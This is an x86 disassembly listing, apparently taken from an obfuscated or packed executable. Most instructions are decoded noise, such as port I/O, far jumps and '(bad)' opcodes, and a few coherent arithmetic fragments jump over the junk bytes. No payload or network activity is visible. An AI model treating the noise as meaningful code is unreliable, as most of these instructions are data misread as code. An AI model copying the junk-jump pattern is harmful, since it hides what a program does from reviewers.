  40d067:	in     al,0x48
  40d069:	gs gs aas 
  40d06c:	popf   
  40d06d:	xor    esp,ebx
  40d06f:	loope  0x40d0c5
  40d071:	cmp    bh,BYTE PTR [ebp-0x25]
  40d074:	les    edx,FWORD PTR [ebp+ebx*2+0x6]
  40d078:	test   DWORD PTR [esi+edx*8],esi
  40d07b:	ds pop edx
  40d07d:	adc    BYTE PTR ds:0xdbd1e740,bh
  40d083:	std    
  40d084:	dec    esp
  40d085:	lea    edi,[esi-0x26c29cb2]
  40d08b:	mov    dh,0x39
  40d08d:	lea    edi,[eax]
  40d08f:	popf   
  40d090:	xor    eax,0x79240b55
  40d095:	inc    ebx
  40d096:	inc    ebp
  40d097:	mov    ah,BYTE PTR [ebx-0x730d1a81]
  40d09d:	add    BYTE PTR [ebp-0x3f23af56],0xdf
  40d0a4:	adc    eax,0xa85dd728
  40d0a9:	and    eax,0x58047619
  40d0ae:	cli    
  40d0af:	push   edi
  40d0b0:	xchg   DWORD PTR [ecx],edx
  40d0b2:	retf   0x7872
  40d0b5:	jl     0x40d0b3
  40d0b7:	std    
  40d0b8:	cwde   
  40d0b9:	jecxz  0x40d105
  40d0bb:	js     0x40d07a
  40d0bd:	and    eax,0x47659723
  40d0c2:	aas    
  40d0c3:	jbe    0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	(bad)  
  40d0ee:	cli    
  40d0ef:	dec    ebx
  40d0f0:	lock mov edx,0x70709daa
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d0a6
  40d0fb:	fild   WORD PTR [eax-0x19c787d0]
  40d101:	jecxz  0x40d164
  40d103:	popf   
  40d104:	mov    BYTE PTR [ecx],bh
  40d106:	push   ebp
  40d107:	rcr    al,1
  40d109:	cmp    al,0xcd
  40d10b:	packsswb mm6,QWORD PTR [ecx+edi*8]
  40d10f:	sar    eax,1
  40d111:	into   
  40d112:	imul   DWORD PTR [eax]
  40d114:	mov    al,es:0xbac2aa3e
  40d11a:	inc    esi
  40d11b:	repz dec ecx
  40d11d:	popa   
  40d11e:	pop    ebp
  40d11f:	jl     0x40d19e
  40d121:	mov    edi,0x61fdda0
  40d126:	out    0xc6,al
  40d128:	lahf   
  40d129:	jo     0x40d103
  40d12b:	ins    BYTE PTR es:[edi],dx
  40d12c:	cld    
  40d12d:	clc    
  40d12e:	call   0xdbdd527e
  40d133:	xor    edi,ebp
  40d135:	ss das 
  40d137:	fsubr  QWORD PTR [edi-0x7e]
  40d13a:	or     edi,DWORD PTR [edi-0x5bccc566]
  40d140:	or     al,0x57
  40d142:	push   esp
  40d143:	dec    esi
  40d144:	lds    esi,FWORD PTR ds:0x916d3ef8
  40d14a:	add    DWORD PTR [edx],0xffffff85
  40d14d:	and    DWORD PTR [esi+0x4f],esi
  40d150:	cmp    cl,BYTE PTR es:[edi+0x70db02ee]
  40d157:	jp     0x40d0d9
  40d159:	jmp    0x2cc886ee
  40d15e:	add    BYTE PTR [edx+0x41],dh
  40d161:	ds xor al,0x2b
  40d164:	cld    
  40d165:	loope  0x40d143
  40d167:	iret   
  40d168:	mov    ch,0x77
  40d16a:	push   ecx
  40d16b:	repnz cli 
  40d16d:	jmp    0xa28d1db4
  40d172:	idiv   BYTE PTR [esi-0x56986372]
  40d178:	xchg   DWORD PTR ds:0x9bea50b0,esp
  40d17e:	lock sbb al,BYTE PTR es:[ebp+esi*2+0x331a1656]
  40d187:	lods   al,BYTE PTR ds:[esi]
  40d188:	inc    ebx
  40d189:	cmc    
  40d18a:	xchg   cl,bl
  40d18c:	lds    ecx,FWORD PTR [ebx]
  40d18e:	inc    edi
  40d18f:	adc    al,0xa4
  40d191:	add    dh,dl
  40d193:	retf   0xf355
  40d196:	in     eax,dx
  40d197:	mov    esp,0x4dc811ef
  40d19c:	push   ebp
  40d19d:	outs   dx,DWORD PTR ds:[esi]
  40d19e:	neg    DWORD PTR [esi]
  40d1a0:	fcomi  st,st(4)
  40d1a2:	mov    eax,ds:0x6a79195f
  40d1a7:	repz push ss
  40d1a9:	xchg   ebx,eax
  40d1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1ab:	clc    
  40d1ac:	and    DWORD PTR [ecx+0x1f68f854],edi
  40d1b2:	sub    dh,BYTE PTR [edx]
  40d1b4:	pop    edi
  40d1b5:	outs   dx,DWORD PTR ds:[esi]
  40d1b6:	icebp  
  40d1b7:	mov    gs,eax
  40d1b9:	in     eax,0xb1
  40d1bb:	mov    dh,0xab
  40d1bd:	out    dx,al
  40d1be:	push   esp
  40d1bf:	mov    ebx,0xd536475b
  40d1c4:	mov    ds:0x28923d59,eax
  40d1c9:	and    eax,0x10191027
  40d1ce:	xchg   edi,eax
  40d1cf:	mov    bl,0xe
  40d1d1:	aas    
  40d1d2:	jb     0x40d252
  40d1d4:	inc    edi
  40d1d5:	data16 and al,0x62
  40d1d8:	sbb    BYTE PTR [ebp+0x5e025044],al
  40d1de:	pushf  
  40d1df:	pop    es
  40d1e0:	in     al,0x18
  40d1e2:	outs   dx,BYTE PTR ds:[esi]
  40d1e3:	pusha  
  40d1e4:	(bad)  
  40d1e5:	mov    ah,0x8a
  40d1e7:	or     bh,ah
  40d1e9:	je     0x40d236
  40d1eb:	popf   
  40d1ec:	mov    WORD PTR [eax-0xf38d0e2],fs
  40d1f2:	jle    0x40d25b
  40d1f4:	inc    eax
  40d1f5:	std    
  40d1f6:	inc    esi
  40d1f7:	add    eax,DWORD PTR [ecx+0x3b55e22a]
  40d1fd:	es stos DWORD PTR es:[edi],eax
  40d1ff:	or     esp,DWORD PTR [esp+edx*4+0x2d8ae866]
  40d206:	inc    eax
  40d207:	jb     0x40d1ef
  40d209:	stos   DWORD PTR es:[edi],eax
  40d20a:	stc    
  40d20b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d20c:	inc    esp
  40d20d:	mov    eax,0xee6e581
  40d212:	xor    eax,0xa2986bd5
  40d217:	shl    DWORD PTR [ebx+edi*8-0x5d],1
  40d21b:	jnp    0x40d19f
  40d21d:	stc    
  40d21e:	bound  ecx,QWORD PTR [ecx]
  40d220:	mov    dl,0xe9
  40d222:	adc    esp,DWORD PTR [esi+0x704af450]
  40d228:	frstor [edi+0xcb6ebdb]
  40d22e:	mov    cl,0x87
  40d230:	int3   
  40d231:	xor    DWORD PTR [esi],esi
  40d233:	or     DWORD PTR [esp+ebp*4],ecx
  40d236:	sbb    eax,0x29c2423c
  40d23b:	cmp    DWORD PTR [edx-0x13],ebx
  40d23e:	rol    DWORD PTR ds:0xb625c944,cl
  40d244:	sbb    edi,DWORD PTR [ecx]
  40d246:	outs   dx,DWORD PTR ds:[esi]
  40d247:	pop    es
  40d248:	les    ebp,FWORD PTR [ebx+0x74]
  40d24b:	sahf   
  40d24c:	pop    ebp
  40d24d:	leave  
  40d24e:	or     eax,0x5f433c6e
  40d253:	or     DWORD PTR [ecx+0x328523fb],0xfffffff2
  40d25a:	mov    ah,0x7c
  40d25c:	lea    ecx,[ecx]
  40d25e:	lock out 0x2e,al
  40d261:	dec    edx
  40d262:	mov    edx,0xed853662
  40d267:	mov    BYTE PTR [esi],0xa1
  40d26a:	retf   
  40d26b:	in     eax,0xcc
  40d26d:	out    0xaa,al
  40d26f:	pusha  
  40d270:	iret   
  40d271:	js     0x40d2eb
  40d273:	cmp    DWORD PTR [ecx+0x25],0x20c42ecb
  40d27a:	jnp    0x40d2d3
  40d27c:	loope  0x40d2c3
  40d27e:	sbb    al,0x37
  40d280:	inc    ebp
  40d281:	out    0x3,al
  40d283:	in     eax,0xc2
  40d285:	test   DWORD PTR [ecx+0x3b09f30f],edi
  40d28b:	fist   DWORD PTR [edi+0x2de1550c]
  40d291:	inc    ebp
  40d292:	xchg   ch,ch
  40d294:	push   eax
  40d295:	icebp  
  40d296:	push   cs
  40d297:	js     0x40d2eb
  40d299:	sub    DWORD PTR [edi],ebx
  40d29b:	add    ecx,esp
  40d29d:	and    BYTE PTR [ebx+0x3799daf0],cl
  40d2a3:	fimul  DWORD PTR [esi]
  40d2a5:	adc    BYTE PTR [ecx+ebx*1],0x7f
  40d2a9:	push   edi
  40d2aa:	dec    edi
  40d2ab:	out    0x6e,eax
  40d2ad:	mov    ebx,DWORD PTR ds:0xe6e76cb0
  40d2b3:	add    al,0xe
  40d2b5:	adc    ch,dh
  40d2b7:	pop    es
  40d2b8:	(bad)  
  40d2ba:	imul   bh
  40d2bc:	aam    0xf1
  40d2be:	xchg   al,cl
  40d2c0:	cmp    BYTE PTR [ebx-0x65],ah
  40d2c3:	push   esi
  40d2c4:	int3   
  40d2c5:	mov    edi,0x72ff38eb
  40d2ca:	jp     0x40d260
  40d2cc:	and    DWORD PTR [esi+0x70ba7fe4],ebx
  40d2d2:	imul   ebx,DWORD PTR [esi+eax*2+0x5e957355],0x62
  40d2da:	pop    edi
  40d2db:	push   esp
  40d2dc:	jb     0x40d2ba
  40d2de:	pop    eax
  40d2df:	sbb    eax,0x1bb3512b
  40d2e4:	lds    esp,FWORD PTR [esi]
  40d2e6:	inc    ecx
  40d2e7:	sbb    DWORD PTR [edx+0x2b3b1d53],ebp
  40d2ed:	xchg   edx,eax
  40d2ee:	inc    ebp
  40d2ef:	mov    edi,0x75eebdbd
  40d2f4:	in     al,dx
  40d2f5:	out    dx,al
  40d2f6:	dec    esp
  40d2f7:	imul   ebx,esp,0xffffffdb
  40d2fa:	ror    BYTE PTR [edx],1
  40d2fc:	push   ss
  40d2fd:	nop
  40d2fe:	mov    DWORD PTR [ecx+0x1c],edi
  40d301:	stos   DWORD PTR es:[edi],eax
  40d302:	cmp    dl,bh
  40d304:	lds    edi,FWORD PTR [edx+eiz*1]
  40d307:	mov    bh,0x9e
  40d309:	inc    edx
  40d30a:	rcl    ah,cl
  40d30c:	jne    0x40d31e
  40d30e:	mov    bh,0x8
  40d310:	xchg   ebp,eax
  40d311:	cdq    
  40d312:	and    bl,BYTE PTR [eax+0x4b]
  40d315:	out    dx,eax
  40d316:	js     0x40d35d
  40d318:	pop    edi
  40d319:	mov    BYTE PTR [edx+0x43159c02],dl
  40d31f:	dec    ebx
  40d320:	jnp    0x40d33a
  40d322:	retf   
  40d323:	cmp    cl,BYTE PTR [ebp+ebx*1+0x40]
  40d327:	and    BYTE PTR ds:0x16791df2,ah
  40d32d:	lahf   
  40d32e:	lds    edi,FWORD PTR [ecx]
  40d330:	push   ebp
  40d331:	and    eax,0x2ec80d4d
  40d336:	test   eax,0xb8491182
  40d33b:	not    DWORD PTR [esp+ecx*1-0x3651679f]
  40d342:	sar    DWORD PTR [ebp+0x4403cc46],cl
  40d348:	mov    ah,bl
  40d34a:	clc    
  40d34b:	loopne 0x40d327
  40d34d:	in     al,0x20
  40d34f:	push   ds
  40d350:	fisttp WORD PTR [ebp-0x2bf2c3e0]
  40d356:	nop
  40d357:	mov    ah,0xab
  40d359:	and    BYTE PTR [edi-0x20],bl
  40d35c:	enter  0x8fa1,0x6a
  40d360:	leave  
  40d361:	xlat   BYTE PTR ds:[ebx]
  40d362:	ret    
  40d363:	sar    ah,cl
  40d365:	aad    0x5d
  40d367:	or     ebp,esi
  40d369:	jbe    0x40d3cc
  40d36b:	push   ds
  40d36c:	sub    BYTE PTR [edi+0x2c23fad8],dh
  40d372:	xchg   esp,eax
  40d373:	test   dh,cl
  40d375:	or     al,0x6c
  40d377:	xchg   esp,eax
  40d378:	retf   0x1089
  40d37b:	in     al,dx
  40d37c:	push   cs
  40d37d:	lods   al,BYTE PTR ds:[esi]
  40d37e:	rol    DWORD PTR [esi-0x41],cl
  40d381:	sbb    eax,0xa2415006
  40d386:	xor    al,0xc4
  40d388:	add    al,0xb5
  40d38a:	inc    ecx
  40d38b:	retf   
  40d38c:	push   0xffffffef
  40d38e:	hlt    
  40d38f:	mov    cs,WORD PTR [edx]
  40d391:	(bad)  
  40d393:	inc    ebx
  40d394:	sbb    al,dh
  40d396:	or     DWORD PTR [esi+eiz*2-0x4899598c],esp
  40d39d:	dec    ebx
  40d39e:	mov    al,ds:0xd5764656
  40d3a3:	cmp    edx,edi
  40d3a5:	add    al,0xac
  40d3a7:	pop    ds
  40d3a8:	shl    BYTE PTR [edx-0x1f227fe6],cl
  40d3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3af:	cdq    
  40d3b0:	nop
  40d3b1:	or     ecx,DWORD PTR [ecx]
  40d3b3:	idiv   BYTE PTR [ebx+0x71e74215]
  40d3b9:	dec    ebp
  40d3ba:	ss leave 
  40d3bc:	cmc    
  40d3bd:	gs ja  0x40d363
  40d3c0:	jnp    0x40d396
  40d3c2:	sub    DWORD PTR [edi],edi
  40d3c4:	fcom   st(3)
  40d3c6:	in     eax,dx
  40d3c7:	jne    0x40d400
  40d3c9:	sbb    cl,BYTE PTR [edx-0x80]
  40d3cc:	sbb    BYTE PTR [edi+0x6],dl
  40d3cf:	xor    eax,0x50957268
  40d3d4:	sar    DWORD PTR [eax-0x612351b8],cl
  40d3da:	imul   edx,DWORD PTR [edx-0x10b9ae46],0xffffff8d
  40d3e1:	int    0x80
  40d3e3:	inc    esp
  40d3e4:	addr16 push ebx
  40d3e6:	jno    0x40d3e5
  40d3e8:	xchg   edx,eax
  40d3e9:	mov    esp,0x70b0c81
  40d3ee:	mov    ebp,es
  40d3f0:	sahf   
  40d3f1:	outs   dx,DWORD PTR ds:[esi]
  40d3f2:	jg     0x40d3a6
  40d3f4:	xchg   edx,eax
  40d3f5:	xor    ch,0x66
  40d3f8:	mov    edx,0xd9bb21f7
  40d3fd:	jg     0x40d418
  40d3ff:	push   0x9dba568a
  40d404:	pop    edx
  40d405:	mov    al,ds:0x1e50fcd8
  40d40a:	dec    edx
  40d40b:	and    BYTE PTR [ebx],0x6
  40d40e:	cli    
  40d40f:	sbb    DWORD PTR [esp+ebp*8+0x25],esp
  40d413:	les    eax,FWORD PTR [eax]
  40d415:	sbb    ah,BYTE PTR [edx]
  40d417:	inc    esi
  40d418:	jle    0x40d3c4
  40d41a:	pop    ebx
  40d41b:	mov    edi,0x2da4f64b
  40d420:	loope  0x40d492
  40d422:	cmp    ebp,DWORD PTR ds:0xab1cc4d2
  40d428:	mov    ebx,0x8ad894ac
  40d42d:	imul   esp,DWORD PTR [edx],0xe5e61ff5
  40d433:	sbb    al,0x31
  40d435:	sub    esi,edx
  40d437:	sbb    ecx,DWORD PTR [esi+ebp*8-0x953d95b]
  40d43e:	(bad)  
  40d43f:	sahf   
  40d440:	mov    cl,0x37
  40d442:	and    DWORD PTR [edx+0x31],esp
  40d445:	aas    
  40d446:	not    dh
  40d448:	sbb    DWORD PTR [ecx-0x176ed202],edi
  40d44e:	add    edx,DWORD PTR [ebx+0x8a8da86]
  40d454:	adc    ebx,DWORD PTR [ecx]
  40d456:	std    
  40d457:	bound  ebx,QWORD PTR [edi+0x18]
  40d45a:	mov    edx,0xa0478ff8
  40d45f:	aas    
  40d460:	daa    
  40d461:	and    dl,BYTE PTR [edi-0x5cef1d95]
  40d467:	imul   eax,DWORD PTR [edx+0x40f1434d],0x3b
  40d46e:	shr    bl,1
  40d470:	cld    
  40d471:	cld    
  40d472:	push   0xe22f61f7
  40d477:	mov    edi,0xd47c0877
  40d47c:	or     bh,dl
  40d47e:	stc    
  40d47f:	inc    edx
  40d480:	xchg   eax,ebp
  40d482:	xlat   BYTE PTR ds:[ebx]
  40d483:	add    al,0xd5
  40d485:	pop    eax
  40d486:	in     eax,dx
  40d487:	ret    0x19e5
  40d48a:	cli    
  40d48b:	mov    dh,0x2d
  40d48d:	mov    dl,0xec
  40d48f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d490:	dec    BYTE PTR [ebp-0x38bd14ae]
  40d496:	scas   al,BYTE PTR es:[edi]
  40d497:	mov    BYTE PTR [ebx+0x7d8bcc4c],bh
  40d49d:	clc    
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0x48d3:0xb81a1d63
  40d4c6:	mov    ah,0x67
  40d4c8:	dec    esp
  40d4c9:	leave  
  40d4ca:	cdq    
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d4bd
  40d4d2:	(bad)  
  40d4d3:	mov    eax,0xbaa8b88f
  40d4d8:	pop    ds
  40d4d9:	fdivrp st(4),st
  40d4db:	das    
  40d4dc:	mov    esi,0xfd81d7e
  40d4e1:	mov    esi,0x75afb7fa
  40d4e6:	stos   DWORD PTR es:[edi],eax
  40d4e7:	pop    ds
  40d4e8:	hlt    
  40d4e9:	(bad)  
  40d4ea:	arpl   dx,dx
  40d4ec:	in     al,0xc8
  40d4ee:	cmc    
  40d4ef:	cmp    DWORD PTR [ecx-0x7a81d319],ebx
  40d4f5:	pop    esi
  40d4f6:	aad    0x52
  40d4f8:	retf   0x4381
  40d4fb:	jb     0x40d515
  40d4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4ff:	fwait
  40d500:	loope  0x40d4c7
  40d502:	mov    dh,0x4d
  40d504:	or     eax,0x53d0b661
  40d509:	mov    ecx,0x9ef1b15d
  40d50e:	adc    eax,0x46e78955
  40d513:	xor    dh,BYTE PTR [esi-0x35]
  40d516:	inc    ebx
  40d517:	adc    dh,bh
  40d519:	mov    edx,0x20dff6f2
  40d51e:	jmp    0x25af:0x828a675b
  40d525:	mov    bl,ch
  40d527:	mov    ebx,0x7df595c3
  40d52c:	sub    al,0x8d
  40d52e:	and    cl,dh
  40d530:	mov    ch,0xc0
  40d532:	outs   dx,BYTE PTR ds:[esi]
  40d533:	jge    0x40d4f5
  40d535:	dec    edi
  40d536:	xchg   esp,eax
  40d537:	and    DWORD PTR [ebp+0x64],edi
  40d53a:	mov    bl,0x7e
  40d53c:	ss xchg esi,eax
  40d53e:	leave  
  40d53f:	loopne 0x40d500
  40d541:	mov    ds:0xfc7a1b45,al
  40d546:	push   0xffffffca
  40d548:	sahf   
  40d549:	in     eax,0x7d
  40d54b:	cwde   
  40d54c:	cwde   
  40d54d:	cmp    al,0xd9
  40d54f:	mov    esp,0x37672f2c
  40d554:	fdiv   DWORD PTR [edx+0x486490be]
  40d55a:	je     0x40d522
  40d55c:	pop    eax
  40d55d:	xchg   esp,eax
  40d55e:	sub    DWORD PTR [edi+eax*8+0x3],esi
  40d562:	xchg   ebx,eax
  40d563:	sub    bh,BYTE PTR [eax]
  40d565:	push   es
  40d566:	and    BYTE PTR [edx],bh
  40d568:	mov    ebx,0x13467968
  40d56d:	jb     0x40d5df
  40d56f:	call   0x2d06:0xff77a4e0
  40d576:	push   edi
  40d577:	xchg   BYTE PTR [edi-0x6f],bl
  40d57a:	mov    edx,DWORD PTR [esi*2+0x2880a3dc]
  40d581:	xchg   edi,eax
  40d582:	ret    0x5b12
  40d585:	mov    ds:0xb38f13c2,eax
  40d58a:	mov    eax,ds:0xc489663c
  40d58f:	or     cl,cl
  40d591:	fdiv   st,st(6)
  40d594:	mov    DWORD PTR [edx],esi
  40d596:	and    BYTE PTR [esi-0x79b44f9],ch
  40d59c:	sub    BYTE PTR [edx-0x14],dh
  40d59f:	inc    edi
  40d5a0:	adc    DWORD PTR ds:0x58f8a746,0x4e0d4e2c
  40d5aa:	inc    esp
  40d5ab:	bound  edx,QWORD PTR [ecx+0x4d]
  40d5ae:	jmp    0xd0e2:0xd5bd1d
  40d5b5:	outs   dx,BYTE PTR ds:[esi]
  40d5b6:	out    0x4b,eax
  40d5b8:	xor    eax,0xf46d52c4
  40d5bd:	pop    es
  40d5be:	xlat   BYTE PTR ds:[ebx]
  40d5bf:	scas   eax,DWORD PTR es:[edi]
  40d5c0:	cmp    DWORD PTR [edi+0x3915a2ae],ecx
  40d5c6:	jns    0x40d5d6
  40d5c8:	fwait
  40d5c9:	sub    DWORD PTR [ebx],edx
  40d5cb:	addr16 into 
  40d5cd:	(bad)  
  40d5ce:	es stos BYTE PTR es:[edi],al
  40d5d0:	or     BYTE PTR [ebp-0xba1758a],dl
  40d5d6:	lds    edx,FWORD PTR [edx+0x40]
  40d5d9:	in     al,0x14
  40d5db:	fs sahf 
  40d5dd:	mov    dl,dl
  40d5df:	test   eax,0xff7a977c
  40d5e4:	ja     0x40d5b2
  40d5e6:	inc    eax
  40d5e7:	and    eax,0x7a9808de
  40d5ec:	shr    bh,cl
  40d5ee:	jp     0x40d59f
  40d5f0:	sbb    dl,dh
  40d5f2:	sti    
  40d5f3:	inc    ebx
  40d5f4:	inc    esi
  40d5f5:	mov    WORD PTR [edi],ds
  40d5f7:	out    0x2d,al
  40d5f9:	xchg   esi,eax
  40d5fa:	ret    0xaacf
  40d5fd:	push   cs
  40d5fe:	leave  
  40d5ff:	sub    edi,DWORD PTR [eax+eax*2-0x57d2cfa3]
  40d606:	add    eax,0xaf98bea4
  40d60b:	(bad)  
  40d60d:	xor    al,0xc5
  40d60f:	scas   al,BYTE PTR es:[edi]
  40d610:	jno    0x40d66c
  40d612:	ins    BYTE PTR es:[edi],dx
  40d613:	daa    
  40d614:	(bad)  
  40d615:	pop    ss
  40d616:	lods   eax,DWORD PTR ds:[esi]
  40d617:	push   edi
  40d618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d619:	adc    DWORD PTR [esi+0x6a],edi
  40d61c:	mov    ds:0x2e97b41d,al
  40d621:	test   bl,ah
  40d623:	sub    al,0xd8
  40d625:	xchg   BYTE PTR [esp+ecx*1+0x60],al
  40d629:	adc    al,0xec
  40d62b:	js     0x40d68d
  40d62d:	and    dh,ch
  40d62f:	test   al,0x75
  40d631:	aaa    
  40d632:	or     al,0xfd
  40d634:	push   eax
  40d635:	add    DWORD PTR [ebx+0x3c],ebp
  40d638:	dec    esi
  40d639:	sar    BYTE PTR [ebp-0x55],1
  40d63c:	aaa    
  40d63d:	xor    ch,al
  40d63f:	mov    esp,0x92dae6c7
  40d644:	and    DWORD PTR [ecx],0xb437d5e9
  40d64a:	pop    edi
  40d64b:	ins    BYTE PTR es:[edi],dx
  40d64c:	mov    dh,BYTE PTR [ebx+0x30863cd2]
  40d652:	iret   
  40d653:	paddd  mm3,QWORD PTR [ecx+0x40bbd1c3]
  40d65a:	adc    DWORD PTR [edx-0x4d206e85],ecx
  40d660:	lock popf 
  40d662:	scas   al,BYTE PTR es:[edi]
  40d663:	scas   al,BYTE PTR es:[edi]
  40d664:	pusha  
  40d665:	mov    DWORD PTR [eax-0x3],0x5eaf951e
  40d66c:	mov    edx,esp
  40d66e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d66f:	mov    ds:0x8609b98c,eax
  40d674:	in     eax,dx
  40d675:	out    dx,eax
  40d676:	pop    esi
  40d677:	cmp    esp,0xffffff8d
  40d67a:	sbb    al,0xef
  40d67c:	pop    ebx
  40d67d:	sbb    BYTE PTR [ebx-0x3b8f9b07],dh
  40d683:	or     eax,0x2aeccc3a
  40d688:	sub    eax,0x75af38a9
  40d68d:	mov    ah,0xf7
  40d68f:	icebp  
  40d690:	fs push ebx
  40d692:	pop    ebx
  40d693:	jb     0x40d67b
  40d695:	xchg   ecx,eax
  40d696:	push   es
  40d697:	out    dx,al
  40d698:	dec    edi
  40d699:	imul   edi,DWORD PTR [eax-0xa],0xf9e1881b
  40d6a0:	jle    0x40d62f
  40d6a2:	add    BYTE PTR [esi+0x22],ch
  40d6a5:	test   DWORD PTR [edx+0x3e],ecx
  40d6a8:	push   edi
  40d6a9:	xchg   cl,bl
  40d6ab:	xchg   ebp,eax
  40d6ac:	fdivr  QWORD PTR [ebp-0x58]
  40d6af:	in     eax,dx
  40d6b0:	mov    bl,0x55
  40d6b2:	xor    ebp,DWORD PTR [ebx-0x43]
  40d6b5:	bound  ebx,QWORD PTR [eax+eiz*1+0x1c95f7a9]
  40d6bc:	jmp    0x6e102b1f
  40d6c1:	out    dx,eax
  40d6c2:	mov    ds:0x667249d2,eax
  40d6c7:	push   ss
  40d6c8:	push   cs
  40d6c9:	jne    0x40d66b
  40d6cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6cc:	xor    DWORD PTR [ebp-0x73e9cac1],edi
  40d6d2:	sti    
  40d6d3:	push   ebx
  40d6d4:	jl     0x40d72d
  40d6d6:	and    dh,bh
  40d6d8:	push   ss
  40d6d9:	dec    esp
  40d6da:	dec    esi
  40d6db:	push   ecx
  40d6dc:	(bad)  
  40d6dd:	adc    bl,BYTE PTR [ebx+0x4d892572]
  40d6e3:	add    al,0xce
  40d6e5:	adc    dx,dx
  40d6e8:	xchg   ah,al
  40d6ea:	mov    esi,0xe377b71b
  40d6ef:	aaa    
  40d6f0:	mul    DWORD PTR [ebx]
  40d6f2:	pushf  
  40d6f3:	cmp    edi,DWORD PTR [esp+eax*2-0x3cea832c]
  40d6fa:	sbb    DWORD PTR [ebx-0x3d8598bf],ecx
  40d700:	mov    gs,eax
  40d702:	(bad)  
  40d703:	aad    0xe9
  40d705:	mov    BYTE PTR [ecx],al
  40d707:	call   0x7780:0xa52a5c07
  40d70e:	mov    bl,0xbc
  40d710:	dec    edi
  40d711:	pop    es
  40d712:	mov    al,0x84
  40d714:	das    
  40d715:	aad    0x7d
  40d717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d718:	dec    esp
  40d719:	push   ebx
  40d71a:	shr    DWORD PTR ds:0x2b08a772,1
  40d720:	xor    DWORD PTR [ecx+0x49],esi
  40d723:	mov    ecx,eax
  40d725:	pop    edx
  40d726:	rcl    BYTE PTR [esi-0x6c],cl
  40d729:	dec    edi
  40d72a:	scas   eax,DWORD PTR es:[edi]
  40d72b:	test   BYTE PTR [ebx],bl
  40d72d:	pop    ss
  40d72e:	and    al,BYTE PTR [edx+esi*4+0x7f]
  40d732:	jo     0x40d722
  40d734:	test   DWORD PTR [esi],esp
  40d736:	and    dh,dl
  40d738:	xor    eax,0xc6c6e704
  40d73d:	rcr    ch,cl
  40d73f:	pop    ecx
  40d740:	ret    
  40d741:	mov    eax,ds:0x5e052ffb
  40d746:	fadd   QWORD PTR [edx-0x119279ec]
  40d74c:	shl    BYTE PTR [ecx],1
  40d74e:	leave  
  40d74f:	arpl   WORD PTR [edx+0x62d5b885],dx
  40d755:	rcl    ah,1
  40d757:	loop   0x40d77f
  40d759:	imul   ebx,DWORD PTR [edi-0x66],0xffffff95
  40d75d:	(bad)  [ebp+0x4d]
  40d760:	retf   0x2448
  40d763:	adc    BYTE PTR [eax-0x2b],al
  40d766:	pop    edx
  40d767:	fwait
  40d768:	push   ds
  40d769:	clc    
  40d76a:	into   
  40d76b:	jmp    0x40d715
  40d76d:	dec    edx
  40d76e:	jmp    0x40d7ad
  40d770:	not    DWORD PTR [esi]
  40d772:	and    esp,edx
  40d774:	xor    ebp,DWORD PTR [ebx-0x9f7ec7b]
  40d77a:	dec    edi
  40d77b:	test   BYTE PTR [ecx],0xcf
  40d77e:	jl     0x40d716
  40d780:	js     0x40d706
  40d782:	aam    0xd7
  40d784:	jge    0x40d727
  40d786:	or     al,0xb2
  40d788:	jp     0x40d764
  40d78a:	or     BYTE PTR [ecx+0x42dce6e2],bh
  40d790:	enter  0x4792,0x37
  40d794:	retf   0x5aad
  40d797:	sahf   
  40d798:	fisttp QWORD PTR [esp+eiz*4]
  40d79b:	(bad)  
  40d79c:	in     al,0x34
  40d79e:	enter  0xbdd2,0xe4
  40d7a2:	aaa    
  40d7a3:	inc    ebp
  40d7a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7a5:	jmp    0x40d78f
  40d7a7:	xor    al,BYTE PTR [ecx+0x25]
  40d7aa:	xor    DWORD PTR [edi],edi
  40d7ac:	stos   DWORD PTR es:[edi],eax
  40d7ad:	imul   ecx,ebp,0x5e
  40d7b0:	sbb    ecx,DWORD PTR [edi]
  40d7b2:	and    al,0x55
  40d7b4:	cdq    
  40d7b5:	lahf   
  40d7b6:	or     eax,DWORD PTR [ebp+0x32]
  40d7b9:	sbb    bl,ch
  40d7bb:	add    BYTE PTR [esi+0x65],0x80
  40d7bf:	ja     0x40d7b8
  40d7c1:	fldcw  WORD PTR [ebp-0x2b49dc51]
  40d7c7:	push   ss
  40d7c8:	add    eax,0xba1c41ba
  40d7cd:	mov    ds:0x190a9c8b,al
  40d7d2:	xor    eax,0xfadd8069
  40d7d7:	pop    ebx
  40d7d8:	dec    ebp
  40d7d9:	mov    dh,0xd5
  40d7db:	out    dx,al
  40d7dc:	loopne 0x40d80e
  40d7de:	or     al,0x1d
  40d7e0:	or     al,0xfb
  40d7e2:	pusha  
  40d7e3:	loope  0x40d776
  40d7e5:	push   ebp
